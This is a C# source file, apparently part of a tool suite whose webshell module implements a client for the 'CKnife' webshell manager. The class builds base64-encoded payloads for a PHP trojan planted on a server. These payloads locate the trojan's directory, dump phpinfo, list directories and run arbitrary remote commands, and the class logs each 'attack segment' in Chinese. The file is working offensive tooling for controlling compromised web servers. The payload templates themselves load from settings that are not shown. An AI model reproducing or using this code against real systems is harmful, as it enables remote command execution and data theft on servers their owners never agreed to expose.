using C2.Core;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace C2.Business.CastleBravo.WebShellTool
{
    class CKnife16EXEClient : IClient
    {
        private readonly string prefix;
        private readonly StringBuilder sb;
        private readonly ClientSetting clientSetting;

        public CKnife16EXEClient(string password, string clientSetting)
        {
            this.clientSetting = ClientSetting.LoadSetting(clientSetting);
            this.prefix = password + "=" + this.clientSetting.PHP_MAKE;
            this.sb = new StringBuilder();
        }


        public string FetchLog()
        {
            string ret = sb.ToString(); sb.Clear(); return ret;
        }

        public string MidStrEx(string response)
        {
            string spl = this.clientSetting.SPL;
            string spr = this.clientSetting.SPR;

            int splIndex = response.IndexOf(spl);
            if (splIndex == -1) return string.Empty;

            response = response.Substring(splIndex + spl.Length);

            int sprIndex = response.IndexOf(spr);
            if (sprIndex == -1) return string.Empty;

            return response.Remove(sprIndex);
        }

        public string PHPIndex()
        {
            string payload = prefix.Replace("@PARAM",clientSetting.PHP_INDEX);

            sb.AppendLine("定位Trojan所在目录:")
              .AppendLine(payload)
              .AppendLine(string.Format("攻击段:{0}", ST.SuperDecodeBase64(clientSetting.PHP_INDEX)))
              .AppendLine();

            return payload;
        }

        public string PHPInfo()
        {
            string payload = prefix.Replace("@PARAM", clientSetting.PHP_INFO);

            sb.AppendLine("phpinfo:")
              .AppendLine(payload)
              .AppendLine(string.Format("攻击段:{0}", ST.SuperDecodeBase64(clientSetting.PHP_INFO)))
              .AppendLine();

            return payload;
        }

        public string PHPReadDict(string dict)
        {
            string attack = ST.DecodeBase64(clientSetting.PHP_READDICT).Replace("@PARAM2", dict);
            string payload = prefix.Replace("@PARAM", ST.EncodeBase64(attack));


            sb.AppendLine("遍历目录:")
              .AppendLine(payload)
              .AppendLine(string.Format("攻击段:{0}", attack))
              .AppendLine(string.Format("查询路径:{0}", ST.SuperDecodeBase64(dict)))
              .AppendLine();

            return payload;
        }

        public string PHPShell(string shellEnv, string command)
        {

            string attack = ST.DecodeBase64(clientSetting.PHP_SHELL).Replace("@PARAM1", shellEnv).Replace("@PARAM2", command);
            string payload = prefix.Replace("@PARAM", ST.EncodeBase64(attack));

            sb.AppendLine("Remote Command:" + command)
              .AppendLine(payload)
              .AppendLine(string.Format("攻击段:{0}", attack))
              .AppendLine(string.Format("执行路径:{0}", ST.SuperDecodeBase64(shellEnv)))
              .AppendLine(string.Format("命令:{0}", ST.SuperDecodeBase64(command)))
              .AppendLine();

            return payload;
        }
    }
}
